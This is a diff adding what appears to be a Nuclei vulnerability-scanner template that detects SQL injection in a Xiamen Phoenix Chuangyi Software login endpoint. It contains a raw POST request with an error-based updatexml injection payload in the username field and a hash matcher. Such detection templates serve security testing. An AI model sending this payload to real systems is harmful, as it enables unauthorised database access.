@@ -1,0 +1,24 @@
+id: 100vr-sqli
+
+info:
+  name: 厦门凤凰创壹软件有限公司系统checktypelogin文件SQL注入
+  author: Str1am
+  severity: high
+  tags: 100vr,sqli
+
+requests:
+  - raw:
+      - |
+        POST /100vr/login/checktypelogin/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        username=TestJu' or updatexml(1,concat(0x7e,md5(45643)),1))%23&password=TestJun&remember=TestJun
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0b32d6a87c09c32b3cd90dfd5ef5699"
+        part: body
+        condition: and
